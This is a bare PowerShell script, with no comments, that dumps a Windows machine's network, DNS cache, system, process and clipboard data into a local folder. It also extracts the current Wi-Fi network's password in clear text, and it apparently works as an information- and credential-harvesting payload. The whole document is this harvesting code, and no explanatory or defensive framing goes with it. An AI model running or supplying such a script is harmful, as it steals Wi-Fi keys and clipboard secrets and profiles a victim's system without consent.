mkdir dumped -Force
arp -a > dumped/iplist.txt 
ipconfig > dumped/ipconfig.txt 
ipconfig /displaydns > dumped/dnsdisplay.txt 
systeminfo > dumped/sysinfo.txt 
tasklist > dumped/tasklist.txt
Get-Clipboard > dumped/clipboard.txt
$networkname=Get-NetConnectionProfile | Select-Object -ExpandProperty Name
Netsh wlan show profile name=$networkname key=clear > dumped/networkinfo.txt
